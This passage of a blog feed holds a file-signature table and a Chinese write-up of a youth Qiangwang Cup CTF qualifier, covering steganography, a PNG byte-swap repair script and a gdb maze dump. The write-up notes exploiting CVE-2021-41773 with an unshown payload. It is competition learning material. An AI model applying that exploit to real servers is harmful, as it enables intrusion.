4d 50 93 a7</li><li>50 41 47 45 44 55</li><li>52 54 53 53</li><li>58 43 50 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.smaf</td><td style="text-align:left"><ul><li>mmf</li></ul></td><td style="text-align:left"><ul><li>4d 4d 4d 44 00 00</li></ul></td></tr><tr><td style="text-align:left">audio/midi</td><td style="text-align:left"><ul><li>mid</li><li>midi</li><li>rmi</li></ul></td><td style="text-align:left"><ul><li>4d 54 68 64</li><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">application/vnd.rim.cod</td><td style="text-align:left"><ul><li>cod</li></ul></td><td style="text-align:left"><ul><li>4e 61 6d 65 3a 20</li></ul></td></tr><tr><td style="text-align:left">audio/ogg</td><td style="text-align:left"><ul><li>oga</li><li>ogg</li></ul></td><td style="text-align:left"><ul><li>4f 67 67 53 00 02 00 00</li></ul></td></tr><tr><td style="text-align:left">video/ogg</td><td style="text-align:left"><ul><li>ogv</li></ul></td><td style="text-align:left"><ul><li>4f 67 67 53 00 02 00 00</li></ul></td></tr><tr><td style="text-align:left">application/ogg</td><td style="text-align:left"><ul><li>ogx</li></ul></td><td style="text-align:left"><ul><li>4f 67 67 53 00 02 00 00</li></ul></td></tr><tr><td style="text-align:left">image/x-portable-graymap</td><td style="text-align:left"><ul><li>pgm</li></ul></td><td style="text-align:left"><ul><li>50 35 0a</li></ul></td></tr><tr><td style="text-align:left">application/zip</td><td style="text-align:left"><ul><li>zip</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04</li><li>50 4b 03 04 14 00 01 00</li><li>50 4b 05 06</li><li>50 4b 07 08</li></ul></td></tr><tr><td style="text-align:left">application/vnd.openxmlformats-officedocument.wordprocessingml.document</td><td style="text-align:left"><ul><li>docx</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04 14 00 06 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.openxmlformats-officedocument.presentationml.presentation</td><td style="text-align:left"><ul><li>pptx</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04 14 00 06 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.openxmlformats-officedocument.spreadsheetml.sheet</td><td style="text-align:left"><ul><li>xlsx</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04 14 00 06 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.google-earth.kmz</td><td style="text-align:left"><ul><li>kmz</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.kde.kword</td><td style="text-align:left"><ul><li>kwd</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.oasis.opendocument.text</td><td style="text-align:left"><ul><li>odt</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.oasis.opendocument.presentation</td><td style="text-align:left"><ul><li>odp</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.oasis.opendocument.text-template</td><td style="text-align:left"><ul><li>ott</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.sun.xml.calc</td><td style="text-align:left"><ul><li>sxc</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.sun.xml.draw</td><td style="text-align:left"><ul><li>sxd</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.sun.xml.impress</td><td style="text-align:left"><ul><li>sxi</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.sun.xml.writer</td><td style="text-align:left"><ul><li>sxw</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/x-msmetafile</td><td style="text-align:left"><ul><li>wmz</li><li>wmf</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>d7 cd c6 9a</li></ul></td></tr><tr><td style="text-align:left">application/x-xpinstall</td><td style="text-align:left"><ul><li>xpi</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-xpsdocument</td><td style="text-align:left"><ul><li>xps</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/epub+zip</td><td style="text-align:left"><ul><li>epub</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04 0a 00 02 00</li></ul></td></tr><tr><td style="text-align:left">image/x-cmx</td><td style="text-align:left"><ul><li>cmx</li></ul></td><td style="text-align:left"><ul><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">video/x-msvideo</td><td style="text-align:left"><ul><li>avi</li></ul></td><td style="text-align:left"><ul><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">audio/x-wav</td><td style="text-align:left"><ul><li>wav</li></ul></td><td style="text-align:left"><ul><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">image/webp</td><td style="text-align:left"><ul><li>webp</li></ul></td><td style="text-align:left"><ul><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">application/x-rar-compressed</td><td style="text-align:left"><ul><li>rar</li></ul></td><td style="text-align:left"><ul><li>52 61 72 21 1a 07 00</li></ul></td></tr><tr><td style="text-align:left">application/x-stuffit</td><td style="text-align:left"><ul><li>sit</li></ul></td><td style="text-align:left"><ul><li>53 49 54 21 00</li><li>53 74 75 66 66 49 74 20</li></ul></td></tr><tr><td style="text-align:left">application/vnd.yamaha.smaf-phrase</td><td style="text-align:left"><ul><li>spf</li></ul></td><td style="text-align:left"><ul><li>53 50 46 49 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-wordpro</td><td style="text-align:left"><ul><li>lwp</li></ul></td><td style="text-align:left"><ul><li>57 6f 72 64 50 72 6f</li></ul></td></tr><tr><td style="text-align:left">application/pls+xml</td><td style="text-align:left"><ul><li>pls</li></ul></td><td style="text-align:left"><ul><li>5b 70 6c 61 79 6c 69 73 74 5d</li></ul></td></tr><tr><td style="text-align:left">audio/x-caf</td><td style="text-align:left"><ul><li>caf</li></ul></td><td style="text-align:left"><ul><li>63 61 66 66</li></ul></td></tr><tr><td style="text-align:left">application/x-csh</td><td style="text-align:left"><ul><li>csh</li></ul></td><td style="text-align:left"><ul><li>63 75 73 68 00 00 00 02</li></ul></td></tr><tr><td style="text-align:left">application/pkcs10</td><td style="text-align:left"><ul><li>p10</li></ul></td><td style="text-align:left"><ul><li>64 00 00 00</li></ul></td></tr><tr><td style="text-align:left">audio/x-flac</td><td style="text-align:left"><ul><li>flac</li></ul></td><td style="text-align:left"><ul><li>66 4c 61 43 00 00 00 22</li></ul></td></tr><tr><td style="text-align:left">application/pkix-attr-cert</td><td style="text-align:left"><ul><li>ac</li></ul></td><td style="text-align:left"><ul><li>72 69 66 66</li></ul></td></tr><tr><td style="text-align:left">application/x-apple-diskimage</td><td style="text-align:left"><ul><li>dmg</li></ul></td><td style="text-align:left"><ul><li>78 01 73 0d 62 62 60</li></ul></td></tr><tr><td style="text-align:left">application/vnd.xara</td><td style="text-align:left"><ul><li>xar</li></ul></td><td style="text-align:left"><ul><li>78 61 72 21</li></ul></td></tr><tr><td style="text-align:left">application/rtf</td><td style="text-align:left"><ul><li>rtf</li></ul></td><td style="text-align:left"><ul><li>7b 5c 72 74 66 31</li></ul></td></tr><tr><td style="text-align:left">image/png</td><td style="text-align:left"><ul><li>png</li></ul></td><td style="text-align:left"><ul><li>89 50 4e 47 0d 0a 1a 0a</li></ul></td></tr><tr><td style="text-align:left">application/applixware</td><td style="text-align:left"><ul><li>aw</li></ul></td><td style="text-align:left"><ul><li>8a 01 09 00 00 00 e1 08</li></ul></td></tr><tr><td style="text-align:left">application/java-vm</td><td style="text-align:left"><ul><li>class</li></ul></td><td style="text-align:left"><ul><li>ca fe ba be</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-powerpoint</td><td style="text-align:left"><ul><li>pps</li><li>ppt</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-excel</td><td style="text-align:left"><ul><li>xla</li><li>xls</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">audio/adpcm</td><td style="text-align:left"><ul><li>adp</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-approach</td><td style="text-align:left"><ul><li>apr</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/x-mspublisher</td><td style="text-align:left"><ul><li>pub</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/vnd.visio</td><td style="text-align:left"><ul><li>vsd</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/x-xz</td><td style="text-align:left"><ul><li>xz</li></ul></td><td style="text-align:left"><ul><li>fd 37 7a 58 5a 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.wordperfect</td><td style="text-align:left"><ul><li>wpd</li></ul></td><td style="text-align:left"><ul><li>ff 57 50 43</li></ul></td></tr><tr><td style="text-align:left">image/jpeg</td><td style="text-align:left"><ul><li>jpe</li><li>jpeg</li><li>jpg</li></ul></td><td style="text-align:left"><ul><li>ff d8 ff</li></ul></td></tr><tr><td style="text-align:left">audio/x-aac</td><td style="text-align:left"><ul><li>aac</li></ul></td><td style="text-align:left"><ul><li>ff f1</li><li>ff f9</li></ul></td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第六届强网杯青少年杯</title>
    <link href="/page/wp/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/"/>
    <url>/page/wp/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="战队信息">战队信息</h2><p>战队名称：Rml<br>战队排名：5</p><h2 id="web">web</h2><h3 id="web1">web1</h3><p>CVE-2021-41773，payload直接打</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png0.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="misc">misc</h2><h3 id="misc1">misc1</h3><p>base64解密后得到一张图片，但是每两个字节被换了位置</p><p>修复脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>data=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">2</span>):<br>    f1.write(data[i:i+<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>得到hint<code>密钥就是音乐的财富密码</code>，加上题目描述<code>你知道万能和弦是什么吗?</code>，得到<code>4536251</code></p><p>lsb解密得到flag</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png1.png" srcset="/img/loading.gif" lazyload alt=""></p><h3 id="misc3">misc3</h3><p>binwalk分理出一个压缩包</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png2.png" srcset="/img/loading.gif" lazyload alt=""></p><p>还是lsb解密，密码在图片结尾，<code>7his_1s_p4s5w0rd</code></p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png3.png" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png4.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="reverse">reverse</h2><h3 id="re2">re2</h3><p>通过gdb动态调试获取地图的全貌</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">0</span>层<br> <span class="hljs-attribute">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">1</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">2</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">3</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">4</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">5</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">6</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span><br><br><span class="hljs-attribute">7</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  